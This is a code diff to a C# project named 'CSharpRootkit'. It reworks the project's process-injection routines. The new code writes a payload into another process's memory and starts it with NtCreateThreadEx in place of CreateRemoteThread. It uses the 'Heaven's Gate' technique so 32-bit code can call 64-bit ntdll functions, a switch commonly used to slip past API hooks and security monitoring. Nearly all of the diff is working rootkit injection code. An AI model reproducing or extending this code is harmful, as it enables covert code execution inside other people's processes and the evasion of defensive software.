@@ -40,7 +40,9 @@ namespace CSharpRootkit
             COULDNT_GET_REMOTE_PROCEDURE_HANDLE,
             SHELLCODE_RETURNED_BAD_RESULT,
             HEAVENSGATE_NON_OPERATIONAL,
-            COULDNT_GET_KERNEL_FROM_HEAVENSGATE
+            COULDNT_GET_NTDLL_FROM_HEAVENSGATE,
+            EXCEEDED_TIMEOUT,
+            COULDNT_GET_EXITCODE
         }
 
         public static IntPtr GetProcessHandleWithRequiredRights(int pid)
@@ -128,14 +130,14 @@ namespace CSharpRootkit
 
         }
 
-        public static InjectionStatusCode Inject(int PID, Action function, uint MaxShellCodeWaitTime = 1000)
+        public static InjectionStatusCode Inject(int PID, Action function, uint MaxShellCodeWaitTimeMilli = 1000)
         {
             IntPtr ProcessHandle = GetProcessHandleWithRequiredRights(PID);
             if (ProcessHandle == IntPtr.Zero)
             {
                 return InjectionStatusCode.COULDNT_OPEN_PROCESS;
             }
-            InjectionStatusCode result = Inject(ProcessHandle, function, MaxShellCodeWaitTime);
+            InjectionStatusCode result = Inject(ProcessHandle, function, MaxShellCodeWaitTimeMilli);
             NativeMethods.CloseHandle(ProcessHandle);
             return result;
         }
@@ -176,6 +178,7 @@ namespace CSharpRootkit
             uint MEM_RESERVE = 0x00002000;
             uint PAGE_EXECUTE_READWRITE = 0x40;
             uint PAGE_READWRITE = 0x04;
+            uint THREAD_ALL_ACCESS = 0x1FFFFF;
             string NameSpaceAndClass = NameSpace+"."+ Class;
 
             IntPtr WriteAddress = NativeMethods.VirtualAllocEx(ProcessHandle, IntPtr.Zero, (UIntPtr)injectingFile.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -246,14 +249,32 @@ namespace CSharpRootkit
             {
                 return InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
             }
-            IntPtr thread = NativeMethods.CreateRemoteThread(ProcessHandle, IntPtr.Zero, 0, WriteAddress + StartOffset, WriteAddress, 0, out IntPtr TID);
-            if (thread == IntPtr.Zero) 
+            IntPtr thread = IntPtr.Zero;
+            if (NativeMethods.NtCreateThreadEx(ref thread, THREAD_ALL_ACCESS, IntPtr.Zero, ProcessHandle, WriteAddress + StartOffset, WriteAddress, false, 0, 0, 0, IntPtr.Zero)!=0) 
             {
                 return InjectionStatusCode.COULDNT_CREATE_REMOTE_THREAD;
             }
-            NativeMethods.WaitForSingleObject(thread, MaxWaitTime);
-            NativeMethods.GetExitCodeThread(thread, out uint excode);
-            if (excode == uint.MaxValue)
+
+            IntPtr TimeOut = Marshal.AllocHGlobal(sizeof(long));
+            Marshal.WriteInt64(TimeOut, -(MaxWaitTime * 1000000) / 100);//convert the milliconds to 100-nanosecond intervals, (negative to indicate relative)
+
+            if (NativeMethods.NtWaitForSingleObject(thread, false, TimeOut) != 0) 
+            {
+                Marshal.FreeHGlobal(TimeOut);
+                return InjectionStatusCode.EXCEEDED_TIMEOUT;
+            }
+            Marshal.FreeHGlobal(TimeOut);
+            uint HandleStructSize = (uint)Marshal.SizeOf(typeof(InternalStructs.THREAD_BASIC_INFORMATION));
+            IntPtr pInfo = Marshal.AllocHGlobal((int)HandleStructSize);
+            if (NativeMethods.NtQueryInformationThread(thread, InternalStructs.THREADINFOCLASS.ThreadBasicInformation, pInfo, HandleStructSize, out uint _) != 0)
+            {
+                Marshal.FreeHGlobal(pInfo);
+                return InjectionStatusCode.COULDNT_GET_EXITCODE;
+            }
+
+            InternalStructs.THREAD_BASIC_INFORMATION basicInfo = Marshal.PtrToStructure<InternalStructs.THREAD_BASIC_INFORMATION>(pInfo);
+            Marshal.FreeHGlobal(pInfo);
+            if (basicInfo.ExitStatus == uint.MaxValue)
             {
                 return InjectionStatusCode.SHELLCODE_RETURNED_BAD_RESULT;
             }
@@ -267,6 +288,7 @@ namespace CSharpRootkit
             uint MEM_RESERVE = 0x00002000;
             uint PAGE_EXECUTE_READWRITE = 0x40;
             uint PAGE_READWRITE = 0x04;
+            uint THREAD_ALL_ACCESS = 0x1FFFFF;
             string NameSpaceAndClass = NameSpace + "." + Class;
 
             IntPtr WriteAddress = NativeMethods.VirtualAllocEx(ProcessHandle, IntPtr.Zero, (UIntPtr)injectingFile.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -338,13 +360,33 @@ namespace CSharpRootkit
             uint excode;
             if (Environment.Is64BitProcess)
             {
-                IntPtr thread = NativeMethods.CreateRemoteThread(ProcessHandle, IntPtr.Zero, 0, WriteAddress + StartOffset, WriteAddress, 0, out IntPtr TID);
-                if (thread == IntPtr.Zero)
+                IntPtr thread = IntPtr.Zero;
+                if (NativeMethods.NtCreateThreadEx(ref thread, THREAD_ALL_ACCESS, IntPtr.Zero, ProcessHandle, WriteAddress + StartOffset, WriteAddress, false, 0, 0, 0, IntPtr.Zero) != 0)
                 {
                     return InjectionStatusCode.COULDNT_CREATE_REMOTE_THREAD;
                 }
-                NativeMethods.WaitForSingleObject(thread, MaxWaitTime);
-                NativeMethods.GetExitCodeThread(thread, out excode);
+
+                IntPtr TimeOut = Marshal.AllocHGlobal(sizeof(long));
+                Marshal.WriteInt64(TimeOut, -(MaxWaitTime * 1000000)/100);//convert the milliconds to 100-nanosecond intervals, (negative to indicate relative)
+
+                if (NativeMethods.NtWaitForSingleObject(thread, false, TimeOut) != 0)
+                {
+                    Marshal.FreeHGlobal(TimeOut);
+                    return InjectionStatusCode.EXCEEDED_TIMEOUT;
+                }
+                Marshal.FreeHGlobal(TimeOut);
+
+                uint HandleStructSize = (uint)Marshal.SizeOf(typeof(InternalStructs.THREAD_BASIC_INFORMATION));
+                IntPtr pInfo = Marshal.AllocHGlobal((int)HandleStructSize);
+                if (NativeMethods.NtQueryInformationThread(thread, InternalStructs.THREADINFOCLASS.ThreadBasicInformation, pInfo, HandleStructSize, out uint _) != 0) 
+                {
+                    Marshal.FreeHGlobal(pInfo);
+                    return InjectionStatusCode.COULDNT_GET_EXITCODE;
+                }
+
+                InternalStructs.THREAD_BASIC_INFORMATION basicInfo = Marshal.PtrToStructure<InternalStructs.THREAD_BASIC_INFORMATION>(pInfo);
+                Marshal.FreeHGlobal(pInfo);
+                excode = basicInfo.ExitStatus;
             }
             else
             {
@@ -352,25 +394,46 @@ namespace CSharpRootkit
                 {
                     return InjectionStatusCode.HEAVENSGATE_NON_OPERATIONAL;
                 }
-                ulong Kernel64Handle = HeavensGate.LoadKernel32();
-                if (Kernel64Handle == 0) 
+                ulong ntdll64Handle = HeavensGate.GetModuleHandle64("ntdll.dll");
+                if (ntdll64Handle == 0) 
                 {
-                    return InjectionStatusCode.COULDNT_GET_KERNEL_FROM_HEAVENSGATE;
+                    return InjectionStatusCode.COULDNT_GET_NTDLL_FROM_HEAVENSGATE;
                 }
-                ulong CreateRemoteThreadHandle = HeavensGate.GetProcAddress64(Kernel64Handle, "CreateRemoteThread");
-                ulong WaitForSingleObjectHandle = HeavensGate.GetProcAddress64(Kernel64Handle, "WaitForSingleObject");
-                ulong GetExitCodeThreadHandle = HeavensGate.GetProcAddress64(Kernel64Handle, "GetExitCodeThread");
-                ulong thread = HeavensGate.Execute64(CreateRemoteThreadHandle, (ulong)ProcessHandle, 0, 0, (ulong)(WriteAddress + StartOffset), (ulong)WriteAddress, 0, 0);
-                if (thread == 0)
+                ulong NtCreateThreadExHandle = HeavensGate.GetProcAddress64(ntdll64Handle, "NtCreateThreadEx");
+                ulong NtWaitForSingleObjectHandle = HeavensGate.GetProcAddress64(ntdll64Handle, "NtWaitForSingleObject");
+                ulong NtQueryInformationThreadHandle = HeavensGate.GetProcAddress64(ntdll64Handle, "NtQueryInformationThread");
+
+                IntPtr pThread = Marshal.AllocHGlobal(sizeof(ulong));
+                if (HeavensGate.Execute64(NtCreateThreadExHandle, (ulong)pThread, THREAD_ALL_ACCESS, 0, (ulong)ProcessHandle, (ulong)(WriteAddress + StartOffset), (ulong)WriteAddress, 0, 0, 0, 0, 0) != 0)
                 {
+                    Marshal.FreeHGlobal(pThread);
                     return InjectionStatusCode.COULDNT_CREATE_REMOTE_THREAD;
                 }
-                //make sure thread isnt 0
-                HeavensGate.Execute64(WaitForSingleObjectHandle, thread, MaxWaitTime);
-                IntPtr outUintHandle = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(InternalStructs.UINTRESULT)));
-                HeavensGate.Execute64(GetExitCodeThreadHandle, thread, (ulong)outUintHandle);
-                excode = Marshal.PtrToStructure<InternalStructs.UINTRESULT>(outUintHandle).Value;
-                Marshal.FreeHGlobal(outUintHandle);
+                
+                ulong thread = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(pThread).Value;
+                Marshal.FreeHGlobal(pThread);
+
+                IntPtr TimeOut = Marshal.AllocHGlobal(sizeof(long));
+                Marshal.WriteInt64(TimeOut, -(MaxWaitTime * 1000000) / 100);//convert the milliconds to 100-nanosecond intervals, (negative to indicate relative)
+
+                if (HeavensGate.Execute64(NtWaitForSingleObjectHandle, thread, 0, (ulong)TimeOut) != 0)
+                {
+                    Marshal.FreeHGlobal(TimeOut);
+                    return InjectionStatusCode.EXCEEDED_TIMEOUT;
+                }
+                Marshal.FreeHGlobal(TimeOut);
+
+                uint HandleStructSize = (uint)Marshal.SizeOf(typeof(InternalStructs64.THREAD_BASIC_INFORMATION64));
+                IntPtr pInfo = Marshal.AllocHGlobal((int)HandleStructSize);
+                if (HeavensGate.Execute64(NtQueryInformationThreadHandle, thread, (uint)InternalStructs.THREADINFOCLASS.ThreadBasicInformation, (ulong)pInfo, HandleStructSize, 0) != 0)
+                {
+                    Marshal.FreeHGlobal(pInfo);
+                    return InjectionStatusCode.COULDNT_GET_EXITCODE;
+                }
+
+                InternalStructs64.THREAD_BASIC_INFORMATION64 basicInfo = Marshal.PtrToStructure<InternalStructs64.THREAD_BASIC_INFORMATION64>(pInfo);
+                Marshal.FreeHGlobal(pInfo);
+                excode = basicInfo.ExitStatus;
             }
             if (excode == uint.MaxValue)
             {
